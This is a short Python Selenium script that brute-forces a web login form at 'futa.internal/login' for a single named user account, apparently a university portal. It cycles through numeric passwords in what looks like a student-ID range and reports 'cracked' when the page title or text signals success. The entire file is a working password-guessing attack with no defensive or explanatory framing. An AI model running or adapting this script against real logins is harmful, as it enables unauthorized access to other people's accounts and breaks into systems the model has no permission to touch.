from selenium import webdriver
import time

user='xyz@futa.edu.ng'
password=20100000
count=0
browser= webdriver.Chrome("C:/chromedriver.exe")
first=True
browser.get("http://futa.internal/login")
while (password+count)<20180000:
    if ((password+count)%1000)>300:
        password+=10000
        count=0
    try:
        userslot = browser.find_element_by_xpath("/html/body/header/nav/div/div/div/div[2]/form/input[3]")
        passwordslot = browser.find_element_by_xpath("/html/body/header/nav/div/div/div/div[2]/form/input[4]")
        if first:
            userslot.send_keys(user)
        time.sleep(.25)
        passwordslot.send_keys(password+count)
        browser.find_element_by_xpath("/html/body/header/nav/div/div/div/div[2]/form/button").click()
        me = browser.find_element_by_xpath("/html/body/header/nav/div/div/div/div[2]/div")
        data = me.text
        print(data, password+count, browser.title)
        if 'tatus' in browser.title or "login" in data or "multaneous" in data:
            print("congrats cracked",password+count)
            break
        count+=1
        first=False
        if ('server' in data):
            count=count-1

    except:
        if 'tatus' in browser.title or 'TUS' in browser.title:
            print("cracked",password+count)
            break
    
